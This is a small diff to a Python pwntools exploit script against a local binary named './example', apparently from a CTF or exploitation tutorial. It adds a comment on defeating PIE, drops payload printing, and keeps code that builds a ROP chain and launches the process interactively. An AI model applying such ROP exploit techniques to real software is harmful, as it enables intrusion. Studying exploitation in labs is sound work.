@@ -5,6 +5,7 @@ from pwn import *
 from itertools import cycle
 
 elf = ELF("./example")
+# set the base address, to combat PIE
 elf.address = elf.libs['/app/example']
 
 # Now, we can create our attack.
@@ -24,8 +25,6 @@ payload = flat({
 
 print("ropchain:")
 print(rop.dump())
-print("payload:")
-print(rop.chain())
 
 with elf.process([payload]) as p:
     p.interactive()
